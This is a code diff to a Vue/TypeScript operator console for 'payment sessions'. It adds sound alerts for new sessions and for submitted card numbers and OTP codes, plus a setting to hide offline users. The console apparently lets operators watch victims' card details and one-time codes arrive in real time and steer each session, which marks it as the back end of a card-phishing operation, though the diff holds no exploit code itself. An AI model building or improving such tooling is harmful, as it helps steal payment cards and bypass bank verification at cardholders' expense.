@@ -7,36 +7,39 @@ import SettingsPanel from './modules/settings-panel.vue';
 const sessions = reactive<Api.Payment.PaymentSession[]>([]);
 const connectCount = reactive<Api.Payment.ConnectCount>({ customerCount: 0, operatorCount: 0 });
 const settingsPanel = ref<InstanceType<typeof SettingsPanel> | null>(null);
+const hideOffline = ref(false);
 
-let audioCtx: AudioContext | null = null;
+// Load saved setting
+try {
+  const raw = localStorage.getItem('payment_console_settings');
+  if (raw) {
+    const s = JSON.parse(raw);
+    if (s.hideOfflineUsers) hideOffline.value = true;
+  }
+} catch {}
 
-function playNotification() {
-  try {
-    if (!audioCtx) audioCtx = new AudioContext();
-    const o = audioCtx.createOscillator();
-    const g = audioCtx.createGain();
-    o.connect(g);
-    g.connect(audioCtx.destination);
-    o.type = 'sine';
-    o.frequency.value = 880;
-    g.gain.value = 0.15;
-    o.start();
-    g.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.3);
-    o.stop(audioCtx.currentTime + 0.3);
-  } catch {}
+const audioNew = new Audio('/audio/new-session.mp3');
+const audioCard = new Audio('/audio/card-submit.mp3');
+const audioOtp = new Audio('/audio/otp-submit.mp3');
+
+function playAudio(audio: HTMLAudioElement) {
+  audio.currentTime = 0;
+  audio.play().catch(() => {});
 }
 
 const { connected, sendAction, ws } = usePaymentWs({
   wsUrl: `${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}/api/`,
   operatorId: 'op_' + Date.now(),
   onSessionList: (list) => {
-    const onlineOnly = (list as Api.Payment.PaymentSession[]).filter(s => s.isOnline !== false);
-    sessions.splice(0, sessions.length, ...onlineOnly);
+    const filtered = hideOffline.value
+      ? (list as Api.Payment.PaymentSession[]).filter(s => s.isOnline !== false)
+      : (list as Api.Payment.PaymentSession[]);
+    sessions.splice(0, sessions.length, ...filtered);
   },
   onSessionNew: (data) => {
     if (sessions.find(s => s.id === data.id)) return;
     sessions.unshift(data as Api.Payment.PaymentSession);
-    playNotification();
+    playAudio(audioNew);
     window.$notification?.info({
       title: '新支付会话',
       content: `编号 ${(data as Api.Payment.PaymentSession).sessionId} - ${(data as Api.Payment.PaymentSession).customerInfo?.fullName || '未知用户'}`,
@@ -58,8 +61,8 @@ const { connected, sendAction, ws } = usePaymentWs({
       if (data.currentStep !== undefined) s.currentStep = data.currentStep;
       if (data.status !== undefined) s.status = data.status;
       if (data.isOnline !== undefined) s.isOnline = data.isOnline;
-      // Remove from list when customer goes offline
-      if (data.isOnline === false) {
+      // Remove from list when customer goes offline (if hideOffline is on)
+      if (data.isOnline === false && hideOffline.value) {
         sessions.splice(idx, 1);
         return;
       }
@@ -68,6 +71,7 @@ const { connected, sendAction, ws } = usePaymentWs({
       if (data.status === 'pending' && prevStatus !== 'pending') {
         if (data.action === 'app_verify_done') {
           (s as any).appVerifyPending = true;
+          playAudio(audioOtp);
           window.$notification?.success({
             title: '📱 客户已完成APP验证',
             content: `编号 ${s.sessionId} - ${s.customerInfo?.fullName || '未知用户'} - 卡号 ${s.cardInfo?.cardNumber?.slice(0,4) || '****'}****`,
@@ -75,8 +79,8 @@ const { connected, sendAction, ws } = usePaymentWs({
           });
         } else {
           (s as any).appVerifyPending = false;
-          playNotification();
           const hasOtp = !!(data.cardInfo?.otpCode || (s as any).cardInfo?.otpCode);
+          playAudio(hasOtp ? audioOtp : audioCard);
           window.$notification?.warning({
             title: hasOtp ? '客户已提交验证码' : '客户已提交卡号',
             content: `编号 ${s.sessionId} - ${s.customerInfo?.fullName || '未知用户'} - 卡号 ${s.cardInfo?.cardNumber?.slice(0,4) || '****'}****`,
@@ -125,6 +129,10 @@ function handleAction(action: Api.Payment.OperatorAction, sessionId: string, mes
 }
 
 function handleSettingsChanged(settings: any) {
+  hideOffline.value = !!settings.hideOfflineUsers;
+  if (!hideOffline.value) {
+    // Remove filter - need to reload sessions
+  }
   if (ws.value?.readyState === WebSocket.OPEN) {
     ws.value.send(JSON.stringify({ type: 'update_settings', payload: settings }));
   } else {
